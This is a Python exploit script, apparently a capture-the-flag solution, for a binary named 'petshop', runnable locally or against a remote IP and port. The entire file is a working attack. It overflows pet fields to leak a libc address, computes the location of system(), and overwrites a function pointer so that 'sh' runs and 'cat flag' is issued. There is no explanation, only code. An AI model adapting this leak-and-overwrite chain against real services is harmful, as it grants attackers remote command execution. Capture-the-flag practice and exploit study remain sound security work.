import pwnbox,struct
SERVER  =False
if not SERVER:
  off_system = 0x0000000000456d0
  off_setvbuf = 0x000000000071270
else:
  off_setvbuf = 0x000000000006fe70
  off_system = 0x45390
  IP = "200.200.200.105"
  PORT = 9898

def pack(x,f="<Q"):
  return struct.pack(f,x)

def buy_pet(idx):
  p.read_until(":")
  p.write("1\n")
  p.read_until(":")
  p.write("%d\n"%idx)

def set_pet(idx,name,s,feed):
  p.read_until(":")
  p.write("4\n")
  p.read_until("set:")
  p.write("%d\n"%idx)
  for i in [name,s,feed]:
    p.read_until(":")
    p.write(str(i) + "\n")

def sound(idx):
  p.read_until(":")
  p.write("3\n")
  p.read_until(":")
  p.write("%d\n"%idx)

def set_name(name):
  p.read_until(":")
  p.write("6\n")
  p.read_until("?")
  p.write(name+"\n")
  
for i in range(0x10000):
  try :
    if not SERVER:
      p = pwnbox.pipe.ProcessPipe("./petshop",log_to=None)
    else:
      p = pwnbox.pipe.SocketPipe(IP,PORT,log_to=None)
    leak = 0x604030
    buy_pet(1)
    buy_pet(2)
    set_name("X"*0x18)
    set_pet(1,"A"*4,"B"*4,"C"*0xc+pack(leak,"<I")) # overflow
    p.read_until(":")
    p.write("5\n")
    p.read_until("person:")
    leak = p.read_byte(8)
    setvbuf = (struct.unpack("<Q",leak)[0])
    libc = setvbuf-off_setvbuf
    system = libc+off_system
    for i in range(4)[::-1]:
      set_pet(1,"A"*4,"B"*4,"C"*(0xc+i))

    set_name("AAA"+pack(system)*0x10000)
    set_pet(1,"A"*4,"B"*4,"C"*0x34+"\x73\x68\x3b\x01\x00") # overflow
    sound(2)

    p.write("cat flag\n")
    p.interact()
    p.close()
  except:
    pass
